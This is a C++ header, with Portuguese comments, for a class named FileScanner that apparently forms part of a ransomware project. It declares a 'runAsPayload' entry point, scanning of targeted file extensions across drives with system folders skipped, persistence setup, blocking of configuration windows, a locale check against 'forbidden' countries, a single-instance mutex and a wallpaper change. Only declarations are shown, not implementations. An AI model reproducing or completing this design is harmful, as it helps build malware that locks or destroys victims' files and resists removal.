// file_scanner.h
#pragma once

#include <vector>
#include <string>
#include <filesystem>
#include <mutex>
#include <map>
#include <cstdint>

struct PayloadConfig {
    std::wstring wallpaperPath;
    bool persistenceEnabled;
};

class FileScanner {
public:
    FileScanner(const std::vector<std::wstring>& targetExtensions);

    void runAsPayload(const PayloadConfig& config);
    const std::vector<std::wstring>& getFoundFiles() const;

private:
    bool isAlreadyRunning();
    bool isRunningAsAdmin();
    bool setupPersistence(const std::wstring& persistenceName);
    bool blockConfigWindows();
    void scanDirectory(const std::filesystem::path& directoryPath);
    bool isForbiddenCountry(const std::vector<std::wstring>& forbiddenLocales);
    bool setWallpaper(const std::wstring& imagePath);
    void startParallelScan();
    void collectDirectories(const std::filesystem::path& root, std::vector<std::filesystem::path>& dirs);
    void scanSingleDirectory(const std::filesystem::path& dirPath);

    std::wstring mutexName = L"Global\\FileScanner_Mutex_v1_xyz"; // Nome único para o mutex
    std::vector<std::wstring> foundFiles;
    std::map<wchar_t, uint64_t> bytesFoundPerDrive;
    std::mutex resultsMutex; // O "cadeado" para proteger o acesso a foundFiles
    std::vector<std::wstring> targetExtensions;
    const std::vector<std::wstring> ignoredSystemDirs = {
        L"Program Files", L"Program Files (x86)", L"Windows", L"$Recycle.Bin",
        L"ProgramData", L"MSOCache", L"PerfLogs", L"Intel", L"AMD", L"NVIDIA"
    };
};